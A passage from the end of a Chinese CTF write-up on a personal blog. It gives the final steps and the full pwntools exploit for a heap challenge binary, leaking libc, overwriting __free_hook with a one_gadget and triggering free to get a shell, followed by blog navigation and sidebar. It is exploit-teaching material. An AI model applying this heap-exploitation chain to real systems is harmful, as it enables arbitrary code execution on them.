+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">之后就是编辑为 one_gadget 和触发了,这里要注意一定要和自己填入的 size 一样,不然又触发`v1[3] = realloc(*((void **)ptr[v2] + 3), v3 + 1);`,或大或小都不会成功,大的话重新 malloc ,小的话有逃不过检查</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>edit(4,0x51,p64(one))<br>free(0)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>[+] Starting local process ‘.&#x2F;pwn2’: pid 6300<br>0x7f507bfa2000<br>[*] Switching to interactive mode<br>$  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">成功</span><br><span class="line"></span><br><span class="line">## 完整exp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>from pwn import *<br>p &#x3D; process(‘.&#x2F;pwn2’,aslr&#x3D;2)<br>elf &#x3D; ELF(“.&#x2F;pwn2”, checksec&#x3D;False)<br>libc &#x3D; ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’, checksec&#x3D;False)<br>#context.log_level &#x3D; “debug”<br>def new(title,name,size,message):<br>	p.sendafter(‘Input your choice:’,’1’)<br>	p.sendafter(‘title:\n’,title)<br>	p.sendafter(‘name:\n’,name)<br>	p.sendafter(‘message size:\n’,str(size))<br>	p.sendafter(‘message:\n’,message)<br>def edit(ind,size,message):<br>	p.sendafter(‘Input your choice:’,’2’)<br>	p.sendafter(‘Which one?\n’,str(ind))<br>	p.sendafter(‘message size:\n’,str(size))<br>	p.sendafter(‘new message:\n’,message)<br>def show(ind):<br>	p.sendafter(‘Input your choice:’,’3’)<br>	p.sendafter(‘Which one?\n’,str(ind))<br>def free(ind):<br>	p.sendafter(‘Input your choice:’,’4’)<br>	p.sendafter(‘Which one?\n’,str(ind))</p>
+<p>new(‘a’,’a’,0x80,’a’*0x80)<br>new(‘b’,’b’,1,’b’)<br>edit(0,0x90,’1’*8)<br>new(‘d’,’d’,0x80,’d’*8)<br>show(2)<br>p.recvuntil(‘Title: ‘)<br>leak &#x3D; u64(p.recvuntil(‘\n’)[:-1].ljust(8,”\x00”))-0x3c4b64<br>print hex(leak)<br>new(‘a’,’a’,0xf7,’a’*0x20)<br>edit(3,0xb8,’0’)<br>new(‘d’,’d’,1,’d’)<br>edit(3,0xb8,’\x01’*0xc8+p64(0x31)*4+p64(libc.symbols[‘__free_hook’] + leak)+p64(0x51))<br>one&#x3D;leak+0x4526a<br>edit(4,0x51,p64(one))<br>free(0)<br>p.interactive()</p>
+<pre><code>
+最后构造出来的块太恶心了,但还好成功了,本题难点就是内容头数据结构和 realloc 的理解了,剩下没什么难点,算是一个比较考构造的题
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/02/2022-01-02-pwnbeginer/" data-id="cuidLea4PnUjNsVF99qJm-f5E" data-title="pwn 新手向" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/01/04/2022-03-21-note/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Bad pen is better than good brain
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/10/04/2021-10-04-lately/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">研一</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
